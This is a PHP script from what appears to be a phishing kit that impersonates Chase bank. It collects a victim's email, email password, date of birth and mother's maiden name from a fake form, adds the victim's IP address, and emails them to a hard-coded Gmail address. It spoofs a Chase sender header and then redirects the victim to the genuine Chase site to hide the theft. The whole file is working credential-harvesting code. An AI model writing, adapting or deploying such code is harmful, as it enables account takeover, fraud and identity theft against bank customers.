<?php
 

$result = "chase";
$ip = getenv("REMOTE_ADDR");
$datamasii=date("D M d, Y g:i a");
$message .= "Chase Result"."\n";
$message .= "Email : ".$_POST['user']."\n";
$message .= "Email Password: " .$_POST['pass']."\n";
$message .= "Date of Birth: " .$_POST['bday']."\n";
$message .= "Mother's maiden name: " .$_POST['mname']."\n";
$message .= "IP: ".$ip."\n";
mail($recipient,$ip,$message);

$recipient = "alexandrasimon197@gmail.com";
$subject = "Result!!!";
$headers = "From: Chase <reply@chase.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("", "yahoo", $message);
if (mail($recipient,$ip,$message,$headers))

{
?>                    
	
		   <script language=javascript>
window.location='https://www.chase.com/';
</script>
<?

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>